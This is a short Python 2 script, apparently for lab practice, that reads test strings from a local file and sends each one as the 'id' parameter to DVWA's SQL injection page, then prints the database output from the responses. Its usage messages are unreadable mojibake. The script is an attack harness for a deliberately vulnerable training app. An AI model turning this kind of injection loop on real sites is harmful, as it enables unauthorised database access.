import httplib2
import re
import urllib
import sys



argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == -1 or argc > 2:
    print "�÷���python",sys.argv[0],"IP��ַ �˿ں�"
    print "���磺urlΪhttp://127.0.0.1:8080/����IP��ַӦΪ127.0.0.1���˿ں�ӦΪ8080"
    sys.exit()

ip = "192.168.109.147"
port = "80"

if argc >= 1:
    ip = argv[0]
if argc == 2:
    port = argv[1]
	
h=httplib2.Http()
file=open('test.txt','r')
tests=file.readlines()
url="http://"+ip+":"+port+"/DVWA-master/vulnerabilities/sqli/"
response,content=h.request(url)
cookie=response["Set-Cookie"]
header={"cookie":cookie}
for test in tests:
    m=urllib.quote(test)
    n=m.replace('%20','+')
    tmp=url+"?id="+n[:-1]+"&Submit=Submit"
    res,content=h.request(tmp,"GET","",header)
    result=re.findall(r'<pre>(.*?)</pre>',content)
    print result
    print '\n'
